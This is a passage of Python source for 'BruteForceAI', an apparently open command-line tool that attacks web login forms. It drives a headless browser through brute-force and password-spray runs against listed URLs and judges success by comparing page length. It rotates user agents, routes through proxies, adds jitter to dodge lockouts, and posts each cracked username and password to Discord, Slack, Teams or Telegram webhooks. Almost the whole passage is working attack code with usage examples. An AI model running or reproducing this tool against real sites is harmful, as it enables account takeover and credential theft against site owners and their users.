                cols = [d[0] for d in cur.description]
                conn.close()
                print(f"⚠️  Using incomplete analysis (success=False) for {url}")
                return dict(zip(cols, row))

            conn.close()
            return None
        except Exception as e:
            print(f"❌ Error getting selectors from DB: {e}")
            return None

    # ------------------------------------------------------------------
    # Stage 2 – brute-force / password-spray
    # ------------------------------------------------------------------
    def stage2(self, mode="bruteforce", attack="playwright", threads=1):
        """
        Execute the login attack using selectors stored by stage1.

        Args:
            mode   : 'bruteforce' | 'passwordspray'
            attack : 'playwright' (only option)
            threads: parallel workers
        """
        print(f"🚀 Stage 2: {mode} attack  |  method: {attack}  |  threads: {threads}")
        print(f"   URLs: {len(self.urls)}  Usernames: {len(self.usernames)}  Passwords: {len(self.passwords)}")

        if attack != "playwright":
            print("❌ Only 'playwright' is supported as attack method")
            return

        for url in self.urls:
            print(f"\n🎯 Processing: {url}")
            sel = self._get_selectors_from_database(url)
            if not sel:
                print(f"❌ No selectors for {url} – run stage1 (analyze) first")
                continue
            print(f"✅ Selectors loaded  failed_dom_length={sel.get('failed_dom_length')}")

            if mode == "bruteforce":
                self._execute_bruteforce(url, sel, threads)
            elif mode == "passwordspray":
                self._execute_passwordspray(url, sel, threads)
            else:
                print(f"❌ Unknown mode: {mode}")

    # ------------------------------------------------------------------
    # Brute-force
    # ------------------------------------------------------------------
    def _execute_bruteforce(self, url, sel, threads):
        print(f"🔥 Brute-force on {url}")
        combos = [(u, p) for u in self.usernames for p in self.passwords]
        print(f"📊 Total combinations: {len(combos)}")

        if not self.force_retry:
            orig  = len(combos)
            combos = [(u, p) for u, p in combos if not self._attempt_exists(url, u, p)]
            skipped = orig - len(combos)
            if skipped:
                print(f"⏭️  Skipped {skipped} existing attempts")
            if not combos:
                print(f"✅ All combinations already attempted for {url}")
                return

        if self.delay:   print(f"⏱️  Delay: {self.delay}s")
        if self.jitter:  print(f"🎲 Jitter: 0–{self.jitter}s")
        if self.success_exit: print("🚪 Will stop after first successful login")

        if threads == 1:
            cur_user = None
            for i, (u, p) in enumerate(combos, 1):
                if (self.delay or self.jitter) and cur_user == u and i > 1:
                    d = self._calc_delay()
                    self._log(f"⏳ Waiting {d:.2f}s …")
                    time.sleep(d)
                cur_user = u
                self._log(f"🔑 [{i}/{len(combos)}] {u}:{p}")
                if self._attempt_login(url, sel, u, p):
                    self._on_success(url, u, p)
                    if self.success_exit:
                        return
        else:
            stop_flag  = threading.Event() if self.success_exit else None
            u_times    = {u: 0.0 for u in self.usernames}
            u_locks    = {u: threading.Lock() for u in self.usernames}
            completed  = 0
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {
                    ex.submit(self._mt_attempt, url, sel, u, p, stop_flag, u_times, u_locks): (u, p)
                    for u, p in combos
                }
                for f in as_completed(futures):
                    u, p = futures[f]
                    completed += 1
                    try:
                        ok = f.result()
                        self._log(f"🔑 [{completed}/{len(combos)}] {u}:{p} – {'SUCCESS' if ok else 'FAILED'}")
                        if ok:
                            self._on_success(url, u, p)
                            if self.success_exit:
                                stop_flag.set()
                                for rf in futures:
                                    rf.cancel()
                                return
                    except Exception as e:
                        self._log(f"❌ Error {u}:{p} – {e}")

    # ------------------------------------------------------------------
    # Password spray
    # ------------------------------------------------------------------
    def _execute_passwordspray(self, url, sel, threads):
        print(f"💦 Password spray on {url}")
        if self.delay:   print(f"⏱️  Delay between passwords: {self.delay}s")
        if self.jitter:  print(f"🎲 Jitter: 0–{self.jitter}s")
        if self.success_exit: print("🚪 Will stop after first successful login")

        for i, p in enumerate(self.passwords, 1):
            self._log(f"\n🔑 [{i}/{len(self.passwords)}] Password: {p}")

            users = self.usernames
            if not self.force_retry:
                orig  = len(users)
                users = [u for u in users if not self._attempt_exists(url, u, p)]
                skipped = orig - len(users)
                if skipped:
                    print(f"   ⏭️  Skipped {skipped} existing attempts")
                if not users:
                    print(f"   ✅ All users already tried for password: {p}")
                    continue

            if threads == 1:
                for j, u in enumerate(users, 1):
                    self._log(f"   👤 [{j}/{len(users)}] {u}:{p}")
                    if self._attempt_login(url, sel, u, p):
                        self._on_success(url, u, p)
                        if self.success_exit:
                            return
            else:
                stop_flag = threading.Event() if self.success_exit else None
                pw_success = False
                with ThreadPoolExecutor(max_workers=threads) as ex:
                    futures = {
                        ex.submit(self._mt_attempt_simple, url, sel, u, p, stop_flag): u
                        for u in users
                    }
                    for f in as_completed(futures):
                        u = futures[f]
                        try:
                            ok = f.result()
                            self._log(f"   👤 {u}:{p} – {'SUCCESS' if ok else 'FAILED'}")
                            if ok:
                                self._on_success(url, u, p)
                                if self.success_exit:
                                    pw_success = True
                                    stop_flag.set()
                                    for rf in futures:
                                        rf.cancel()
                                    break
                        except Exception as e:
                            self._log(f"   ❌ Error {u}:{p} – {e}")
                if pw_success:
                    return

            if i < len(self.passwords):
                d = self._calc_delay() if (self.delay or self.jitter) else 1.0
                self._log(f"⏳ Waiting {d:.2f}s before next password …")
                time.sleep(d)

    # ------------------------------------------------------------------
    # Multi-threaded wrappers
    # ------------------------------------------------------------------
    def _mt_attempt(self, url, sel, u, p, stop_flag, u_times, u_locks):
        if stop_flag and stop_flag.is_set():
            return False
        if (self.delay or self.jitter) and u in u_locks:
            with u_locks[u]:
                elapsed = time.time() - u_times[u]
                needed  = self._calc_delay()
                if u_times[u] > 0 and elapsed < needed:
                    time.sleep(needed - elapsed)
                u_times[u] = time.time()
        if stop_flag and stop_flag.is_set():
            return False
        return self._attempt_login(url, sel, u, p)

    def _mt_attempt_simple(self, url, sel, u, p, stop_flag):
        if stop_flag and stop_flag.is_set():
            return False
        return self._attempt_login(url, sel, u, p)

    # ------------------------------------------------------------------
    # Core login attempt
    # ------------------------------------------------------------------
    def _attempt_login(self, url, sel, username, password):
        """
        Navigate to url, fill credentials, click submit, and detect success
        via DOM-length comparison against the stored failed-login baseline.
        """
        for attempt in range(self.retry_attempts):
            t0 = time.time()
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(
                        headless=not self.show_browser,
                        slow_mo=100 if self.show_browser else 0,
                    )
                    ctx_args = {"ignore_https_errors": True}
                    if self.proxy:
                        ctx_args["proxy"] = {"server": self.proxy}
                    ua = self._get_random_user_agent()
                    if ua:
                        ctx_args["user_agent"] = ua
                    context = browser.new_context(**ctx_args)
                    page    = context.new_page()

                    page.goto(url, timeout=30000)
                    page.wait_for_load_state("networkidle")

                    u_sel = sel.get("login_username_selector")
                    p_sel = sel.get("login_password_selector")
                    s_sel = sel.get("login_submit_button_selector")

                    if u_sel:
                        page.locator(u_sel).first.clear()
                        page.locator(u_sel).first.fill(username)
                    if p_sel:
                        page.locator(p_sel).first.clear()
                        page.locator(p_sel).first.fill(password)
                    if s_sel:
                        page.locator(s_sel).first.click()

                    try:
                        page.wait_for_load_state("networkidle", timeout=5000)
                    except Exception:
                        time.sleep(2)

                    if self.show_browser and self.browser_wait > 0:
                        time.sleep(self.browser_wait)

                    for s in (u_sel, p_sel):
                        if s:
                            try:
                                page.locator(s).first.clear()
                            except Exception:
                                pass

                    current_html = page.content()
                    current_len  = len(current_html)
                    exp_failed   = sel.get("failed_dom_length")

                    if exp_failed:
                        diff    = abs(current_len - int(exp_failed))
                        success = diff >= self.dom_threshold
                        if self.debug:
                            verdict = "SUCCESS" if success else "FAILED"
                            print(f"   🔍 DOM diff={diff} threshold={self.dom_threshold} → {verdict}")
                    else:
                        print("   ⚠️  No baseline – using heuristics")
                        text = current_html.lower()
                        pos  = sum(1 for w in ("dashboard","welcome","logout","profile","account") if w in text)
                        neg  = sum(1 for w in ("error","invalid","incorrect","failed","wrong","denied") if w in text)
                        success = pos > neg
                        if self.debug:
                            print(f"   🔍 Heuristic pos={pos} neg={neg} → {'SUCCESS' if success else 'FAILED'}")

                    ms = int((time.time() - t0) * 1000)
                    self._save_brute_force_attempt({
                        "url": url, "username_or_email": username, "password": password,
                        "dom_length": str(current_len),
                        "failed_dom_length": str(exp_failed) if exp_failed else None,
                        "success": success, "response_time_ms": ms,
                        "playwright_or_requests": "playwright",
                        "proxy_server": self.proxy, "external_ip": self.external_ip,
                    })
                    browser.close()
                    return success

            except Exception as e:
                err = str(e)
                net_errs = ("ERR_CONNECTION_REFUSED", "ERR_NETWORK_CHANGED",
                            "ERR_INTERNET_DISCONNECTED", "ERR_CONNECTION_TIMED_OUT",
                            "ERR_CONNECTION_RESET", "net::ERR_", "TimeoutError",
                            "Connection refused", "Connection timed out")
                if any(ne in err for ne in net_errs) and attempt < self.retry_attempts - 1:
                    print(f"   🔄 Network error (attempt {attempt+1}/{self.retry_attempts}): {err[:80]}")
                    time.sleep(2)
                    continue
                print(f"   ❌ Login error: {err[:80]}")
                ms = int((time.time() - t0) * 1000)
                self._save_brute_force_attempt({
                    "url": url, "username_or_email": username, "password": password,
                    "dom_length": None,
                    "failed_dom_length": sel.get("failed_dom_length"),
                    "success": False, "response_time_ms": ms,
                    "playwright_or_requests": "playwright",
                    "proxy_server": self.proxy, "external_ip": self.external_ip,
                })
                return False
        return False

    # ------------------------------------------------------------------
    # Database – brute force attempts
    # ------------------------------------------------------------------
    def _save_brute_force_attempt(self, d):
        try:
            conn = sqlite3.connect(self.database)
            conn.cursor().execute("""
                INSERT INTO brute_force_attempts
                (url, username_or_email, password, dom_length, failed_dom_length,
                 success, response_time_ms, playwright_or_requests, proxy_server, external_ip)
                VALUES (?,?,?,?,?,?,?,?,?,?)
            """, (d["url"], d["username_or_email"], d["password"],
                  d["dom_length"], d["failed_dom_length"], d["success"],
                  d["response_time_ms"], d["playwright_or_requests"],
                  d["proxy_server"], d["external_ip"]))
            conn.commit()
            conn.close()
        except Exception as e:
            if self.debug:
                print(f"❌ Error saving attempt: {e}")

    def _attempt_exists(self, url, username, password):
        try:
            conn = sqlite3.connect(self.database)
            cur  = conn.cursor()
            cur.execute("""
                SELECT COUNT(*) FROM brute_force_attempts
                WHERE url=? AND username_or_email=? AND password=?
            """, (url, username, password))
            count = cur.fetchone()[0]
            conn.close()
            return count > 0
        except Exception as e:
            if self.debug:
                print(f"❌ _attempt_exists error: {e}")
            return False

    # ------------------------------------------------------------------
    # Utility helpers
    # ------------------------------------------------------------------
    def _calc_delay(self):
        base = float(self.delay)
        if self.jitter > 0:
            jamt = random.uniform(0, self.jitter)
            if self.debug:
                print(f"🎲 Delay: {base}s + jitter {jamt:.2f}s = {base + jamt:.2f}s")
            return base + jamt
        return base

    def _log(self, msg):
        if self.verbose:
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{ts}] {msg}")
        else:
            print(msg)

    def _on_success(self, url, username, password):
        self._log(f"🎉 SUCCESS! {username}:{password}")
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if self._has_webhooks():
            print("🔔 Sending notifications …")
        self._send_success_notification(url, username, password, ts)

    def _get_external_ip(self):
        try:
            return requests.get("https://api.ipify.org", timeout=2).text.strip()
        except Exception:
            return None

    def _get_random_user_agent(self):
        if self.user_agents:
            ua = random.choice(self.user_agents)
            if self.debug:
                print(f"🎭 User-Agent: {ua[:50]}…")
            return ua
        return None

    # ------------------------------------------------------------------
    # Webhook notifications
    # ------------------------------------------------------------------
    def _has_webhooks(self):
        return any([self.discord_webhook, self.slack_webhook,
                    self.teams_webhook, self.telegram_webhook])

    def _print_webhook_config(self):
        names = []
        if self.discord_webhook:  names.append("Discord")
        if self.slack_webhook:    names.append("Slack")
        if self.teams_webhook:    names.append("Teams")
        if self.telegram_webhook and self.telegram_chat_id: names.append("Telegram")
        if names:
            print(f"🔔 Webhooks enabled: {', '.join(names)}")
        elif self.debug:
            print("🔕 No webhooks configured")

    def _send_success_notification(self, url, username, password, timestamp=None):
        ts   = timestamp or datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        body = (f"**Target:** {url}\n**Username:** {username}\n"
                f"**Password:** {password}\n**Time:** {ts}\n"
                f"**External IP:** {self.external_ip or 'Unknown'}")
        title = "🎉 BruteForceAI Success!"
        if self.discord_webhook: self._notify_discord(title, url, username, password, ts)
        if self.slack_webhook:   self._notify_slack(title, url, username, password, ts)
        if self.teams_webhook:   self._notify_teams(title, url, username, password, ts)
        if self.telegram_webhook and self.telegram_chat_id:
            self._notify_telegram(url, username, password, ts)

    def _notify_discord(self, title, url, username, password, ts):
        try:
            payload = {"embeds": [{"title": title, "color": 0x00FF00,
                "fields": [
                    {"name": "🎯 Target",      "value": url,                  "inline": False},
                    {"name": "👤 Username",     "value": f"`{username}`",      "inline": True},
                    {"name": "🔑 Password",     "value": f"`{password}`",      "inline": True},
                    {"name": "🕐 Time",         "value": ts,                   "inline": True},
                    {"name": "🌐 External IP",  "value": self.external_ip or "Unknown", "inline": True},
                ],
                "footer": {"text": "BruteForceAI by Mor David"},
                "timestamp": datetime.now().isoformat(),
            }]}
            r = requests.post(self.discord_webhook, json=payload, timeout=10)
            if self.debug:
                print(f"Discord response: {r.status_code}")
        except Exception as e:
            print(f"❌ Discord error: {e}")

    def _notify_slack(self, title, url, username, password, ts):
        try:
            payload = {"text": title, "attachments": [{"color": "good", "fields": [
                {"title": "🎯 Target",     "value": url,      "short": False},
                {"title": "👤 Username",   "value": username, "short": True},
                {"title": "🔑 Password",   "value": password, "short": True},
                {"title": "🕐 Time",       "value": ts,       "short": True},
                {"title": "🌐 External IP","value": self.external_ip or "Unknown", "short": True},
            ], "footer": "BruteForceAI by Mor David", "ts": int(datetime.now().timestamp())}]}
            r = requests.post(self.slack_webhook, json=payload, timeout=10)
            if self.debug:
                print(f"Slack response: {r.status_code}")
        except Exception as e:
            print(f"❌ Slack error: {e}")

    def _notify_teams(self, title, url, username, password, ts):
        try:
            payload = {"@type": "MessageCard", "@context": "http://schema.org/extensions",
                "themeColor": "00FF00", "summary": title,
                "sections": [{"activityTitle": title, "facts": [
                    {"name": "🎯 Target",     "value": url},
                    {"name": "👤 Username",   "value": username},
                    {"name": "🔑 Password",   "value": password},
                    {"name": "🕐 Time",       "value": ts},
                    {"name": "🌐 External IP","value": self.external_ip or "Unknown"},
                ], "markdown": True}]}
            r = requests.post(self.teams_webhook, json=payload, timeout=10)
            if self.debug:
                print(f"Teams response: {r.status_code}")
        except Exception as e:
            print(f"❌ Teams error: {e}")

    def _notify_telegram(self, url, username, password, ts):
        try:
            msg = (
                f"🎉 *BruteForceAI Success\\!*\n\n"
                f"🎯 *Target:* `{url}`\n"
                f"👤 *Username:* `{username}`\n"
                f"🔑 *Password:* `{password}`\n"
                f"🕐 *Time:* {ts}\n"
                f"🌐 *External IP:* {self.external_ip or 'Unknown'}\n\n"
                f"_BruteForceAI by Mor David_"
            )
            r = requests.post(
                f"https://api.telegram.org/bot{self.telegram_webhook}/sendMessage",
                json={"chat_id": self.telegram_chat_id, "text": msg, "parse_mode": "MarkdownV2"},
                timeout=10,
            )
            if self.debug:
                print(f"Telegram response: {r.status_code}")
        except Exception as e:
            print(f"❌ Telegram error: {e}")

    # ------------------------------------------------------------------
    def __str__(self):
        return (f"BruteForceAI(urls={len(self.urls)}, "
                f"usernames={len(self.usernames)}, passwords={len(self.passwords)}, "
                f"db={self.database})")


# ===========================================================================
# CLI entry-point
# ===========================================================================
def _build_arg_parser():
    parser = argparse.ArgumentParser(
        description="BruteForceAI – AI-Powered Login Form Analysis & Brute Force Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Analyse login forms (default: ollama + llama3.2:3b)
  python BruteForceAI_Unified.py analyze --urls urls.txt

  # Analyse with Groq
  python BruteForceAI_Unified.py analyze --urls urls.txt \\
      --llm-provider groq --llm-api-key YOUR_KEY

  # Brute-force attack
  python BruteForceAI_Unified.py attack \\
      --urls urls.txt --usernames users.txt --passwords passwords.txt

  # Password spray with 3 threads + Discord webhook
  python BruteForceAI_Unified.py attack \\
      --urls urls.txt --usernames users.txt --passwords passwords.txt \\
      --mode passwordspray --threads 3 \\
      --discord-webhook "https://discord.com/api/webhooks/..."

  # Clean database
  python BruteForceAI_Unified.py clean-db

  # Check for updates
  python BruteForceAI_Unified.py check-updates
        """,
    )
    parser.add_argument("--no-color",           "-nc", action="store_true")
    parser.add_argument("--output",             "-o",  help="Tee all output to a file")
    parser.add_argument("--skip-version-check", action="store_true")

    sub = parser.add_subparsers(dest="command")

    # --- analyze ---
    ap = sub.add_parser("analyze", help="Analyse login forms and store selectors")
    ap.add_argument("--urls",            required=True)
    ap.add_argument("--llm-provider",    choices=["ollama", "groq"])
    ap.add_argument("--llm-model")
    ap.add_argument("--llm-api-key")
    ap.add_argument("--ollama-url")
    ap.add_argument("--selector-retry",  type=int, default=10)
    ap.add_argument("--show-browser",    action="store_true")
    ap.add_argument("--browser-wait",    type=int, default=0)
    ap.add_argument("--proxy")
    ap.add_argument("--database",        default="bruteforce.db")
    ap.add_argument("--force-reanalyze", action="store_true")
    ap.add_argument("--debug",           action="store_true")
    ap.add_argument("--user-agents")
    ap.add_argument("--output",  "-o")
    ap.add_argument("--no-color", "-nc", action="store_true")
    ap.add_argument("--skip-version-check", action="store_true")

    # --- attack ---
    atkp = sub.add_parser("attack", help="Execute brute-force / password-spray attack")
    atkp.add_argument("--urls",            required=True)
    atkp.add_argument("--usernames",       required=True)
    atkp.add_argument("--passwords",       required=True)
    atkp.add_argument("--mode",            choices=["bruteforce","passwordspray"], default="bruteforce")
    atkp.add_argument("--attack",          choices=["playwright"],                 default="playwright")
    atkp.add_argument("--threads",         type=int,   default=1)
    atkp.add_argument("--retry-attempts",  type=int,   default=3)
    atkp.add_argument("--dom-threshold",   type=int,   default=100)
    atkp.add_argument("--delay",           type=float, default=0)
    atkp.add_argument("--jitter",          type=float, default=0)
    atkp.add_argument("--success-exit",    action="store_true")
    atkp.add_argument("--user-agents")
    atkp.add_argument("--show-browser",    action="store_true")
    atkp.add_argument("--browser-wait",    type=int, default=0)
    atkp.add_argument("--proxy")
    atkp.add_argument("--database",        default="bruteforce.db")
    atkp.add_argument("--debug",           action="store_true")
    atkp.add_argument("--verbose",         action="store_true")
    atkp.add_argument("--force-retry",     action="store_true")
    atkp.add_argument("--output",  "-o")
    atkp.add_argument("--no-color", "-nc", action="store_true")
    atkp.add_argument("--skip-version-check", action="store_true")
    atkp.add_argument("--discord-webhook")
    atkp.add_argument("--slack-webhook")
    atkp.add_argument("--teams-webhook")
    atkp.add_argument("--telegram-webhook")
    atkp.add_argument("--telegram-chat-id")

    # --- clean-db ---
    cdp = sub.add_parser("clean-db", help="Truncate all database tables")
    cdp.add_argument("--database", default="bruteforce.db")
    cdp.add_argument("--output",   "-o")
    cdp.add_argument("--no-color", "-nc", action="store_true")
    cdp.add_argument("--skip-version-check", action="store_true")

    # --- check-updates ---
    cup = sub.add_parser("check-updates", help="Check for software updates")
    cup.add_argument("--output",   "-o")
    cup.add_argument("--no-color", "-nc", action="store_true")
    cup.add_argument("--skip-version-check", action="store_true")

    return parser


def main():
    parser = _build_arg_parser()
    args   = parser.parse_args()

    global_skip = "--skip-version-check" in sys.argv

    # Setup output tee
    output_file_arg = getattr(args, "output", None)
    capture = None
    if output_file_arg:
        fn = output_file_arg
        if not (fn.endswith(".txt") or fn.endswith(".log")):
            fn = f"{fn}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        capture = OutputCapture(fn)
        if not capture.start():
            sys.exit(1)
        print(f"📄 Output capture started → {fn}")
        print(f"🕐 Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)

    try:
        no_color     = getattr(args, "no_color", False)
        skip_version = getattr(args, "skip_version_check", False) or global_skip
        print_banner(no_color=no_color, check_updates=not skip_version)

        if not args.command:
            parser.print_help()
            sys.exit(1)

        dispatch = {
            "analyze":      _cmd_analyze,
            "attack":       _cmd_attack,
            "clean-db":     _cmd_clean_db,
            "check-updates": _cmd_check_updates,
        }
        dispatch[args.command](args)

    except KeyboardInterrupt:
        print("\n\n🛑 Interrupted by user (Ctrl+C)")
    except Exception as e:
        print(f"\n\n❌ Unexpected error: {e}")
        raise
    finally:
        if capture:
            print("\n" + "=" * 80)
            print(f"🕐 Session completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            capture.stop()


# ---------------------------------------------------------------------------
# Command handlers
# ---------------------------------------------------------------------------
def _cmd_analyze(args):
    print("🚀 BruteForceAI – Analyze")
    print("=" * 60)

    provider = args.llm_provider or "ollama"
    model    = args.llm_model or ("llama3.2:3b" if provider == "ollama"
                                   else "llama-3.3-70b-versatile")
    print(f"LLM provider : {provider}")
    print(f"LLM model    : {model}")
    print(f"Selector retry: {args.selector_retry}")
    print(f"Show browser : {args.show_browser}")
    print(f"Database     : {args.database}")
    print("=" * 60)

    _validate_llm_setup(provider, model,
                        getattr(args, "llm_api_key", None),
                        getattr(args, "ollama_url",  None))

    bf = BruteForceAI(
        urls_file=args.urls, usernames_file=[], passwords_file=[],
        selector_retry=args.selector_retry,
        show_browser=args.show_browser, browser_wait=args.browser_wait,
        proxy=args.proxy, database=args.database,
        llm_provider=provider, llm_model=model,
        llm_api_key=getattr(args, "llm_api_key", None),
        ollama_url=getattr(args, "ollama_url",  None),
        force_reanalyze=args.force_reanalyze, debug=args.debug,
        user_agents_file=args.user_agents,
    )

    print(f"\n🚀 Analysing {len(bf.urls)} URL(s) …")
    for i, url in enumerate(bf.urls, 1):
        print(f"\n[{i}/{len(bf.urls)}] {url}")
        result = bf.stage1(url)
        print("✅ Done" if result and result.get("success") else "❌ Failed")

    print("\n✅ Analyze completed!")


def _cmd_attack(args):
    print("🚀 BruteForceAI – Attack")
    print("=" * 80)
    for label, val in [
        ("Mode",           args.mode),
        ("Method",         args.attack),
        ("Threads",        args.threads),
        ("Retry attempts", args.retry_attempts),
        ("DOM threshold",  args.dom_threshold),
        ("Delay",          f"{args.delay}s"),
        ("Jitter",         f"{args.jitter}s"),
        ("Success exit",   args.success_exit),
        ("Database",       args.database),
        ("Proxy",          args.proxy or "None"),
    ]:
        print(f"{label:16}: {val}")
    print("=" * 80)

    bf = BruteForceAI(
        urls_file=args.urls, usernames_file=args.usernames,
        passwords_file=args.passwords,
        show_browser=args.show_browser, browser_wait=args.browser_wait,
        proxy=args.proxy, database=args.database,
        debug=args.debug, retry_attempts=args.retry_attempts,
        dom_threshold=args.dom_threshold, verbose=args.verbose,
        delay=args.delay, jitter=args.jitter,
        success_exit=args.success_exit,
        user_agents_file=getattr(args, "user_agents", None),
        force_retry=args.force_retry,
        discord_webhook=getattr(args, "discord_webhook", None),
        slack_webhook=getattr(args, "slack_webhook",    None),
        teams_webhook=getattr(args, "teams_webhook",    None),
        telegram_webhook=getattr(args, "telegram_webhook", None),
        telegram_chat_id=getattr(args, "telegram_chat_id", None),
    )
    bf.stage2(mode=args.mode, attack=args.attack, threads=args.threads)
    print("\n✅ Attack completed!")


def _cmd_clean_db(args):
    print("🧹 BruteForceAI – Clean Database")
    print("=" * 50)
    bf = BruteForceAI(urls_file=[], usernames_file=[], passwords_file=[],
                      database=args.database)
    bf.clean_database()


def _cmd_check_updates(args):
    print("🔄 BruteForceAI – Update Check")
    print("=" * 50)
    result = check_for_updates(silent=False, force=True)
    if result is None:
        print("❌ Update check failed")
    elif result.get("update_available"):
        print("🎉 Update available!")
    else:
        print("✅ You are up to date!")


# ---------------------------------------------------------------------------
if __name__ == "__main__":
    main()
